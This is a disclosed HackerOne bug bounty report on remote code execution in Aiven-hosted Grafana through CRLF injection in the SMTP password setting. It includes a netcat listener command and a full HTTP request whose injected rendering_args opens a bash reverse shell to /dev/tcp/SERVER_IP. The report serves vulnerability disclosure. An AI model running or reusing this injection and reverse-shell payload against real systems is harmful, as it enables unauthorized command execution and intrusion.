# Grafana RCE via SMTP server parameter injection

## Report Details
- **Report ID**: 1200647
- **URL**: https://hackerone.com/reports/1200647
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-05-18T07:33:54.133Z
- **Disclosed**: 2022-11-08T06:29:56.557Z

## Reporter
- **Username**: jarij
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: aiven_ltd

## Vulnerability Information
## Summary:

This report is similar to [#1180653](https://hackerone.com/reports/1180653), except with different parameter injection entrypoint.

SMTP server password configuration setting accepts new line characters. This can be used to set non-exported configuration variables. Using this CRLF-injection, the `rendering_args` of grafana image renderer can be modified which leads to code execution on the Grafana server.

## Steps To Reproduce:

1.Create Aiven Grafana instance
2.Setup netcat listener on your server: `nc -n -lvp 4444`
3.Send the following request to the grafana instance, replace place holders. The aivenv1 token can be retrieved by inspecting the browser traffic.
4. Browse to https://INSTANCE_SUBDOMAIN.aivencloud.com/render/x to trigger the exploit.

```http
PUT /v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME HTTP/1.1
Host: console.aiven.io
Connection: keep-alive
Accept: application/json
Authorization: aivenv1 AIVEN_TOKEN_HERE
X-Aiven-Client-Version: aiven-console/3.5.1-1104.g2809991854
Content-Type: application/json
Origin: https://console.aiven.io

{
    "user_config": {
        "smtp_server": {
            "host": "example.org",
            "port": 1,
            "from_address": "x@examle.org",
            "password": "x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1"
        }
    }
}
```

## Impact

Command execution on the grafana server. Access and modify data on the grafana server and possibly the attacker could pivot into other servers on the aiven network.

## Attachments
No attachments
